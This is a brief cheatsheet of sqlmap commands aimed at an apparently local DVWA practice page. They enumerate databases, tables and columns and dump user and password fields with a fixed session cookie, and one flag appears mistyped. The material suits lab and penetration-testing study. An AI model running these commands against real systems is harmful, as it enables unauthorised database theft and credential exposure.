# SQLMap cheatsheet

```sh
# sqlmap with wizard
sqlmap --wizard

# In the examples below you should change the cookies or add POST data
# Here post is not needed because of the use of get

# Get the current db
sqlmap -u "127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=9malqef2knoa1eq22o4g6pcsk6; security=low" -b --current-db

# Get the tables
sqlmap -u "127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=9malqef2knoa1eq22o4g6pcsk6; security=low" -D replace_with_db_name -tables

# Get columns of specific table
sqlmap -u "127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=9malqef2knoa1eq22o4g6pcsk6; security=low" -D replace_with_db_name -T replace_with_table_name --columns

# Get data from table
sqlmap -u "127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=9malqef2knoa1eq22o4g6pcsk6; security=low" -D replace_with_db_name -T replace_with_table_name -C user,password --dump
```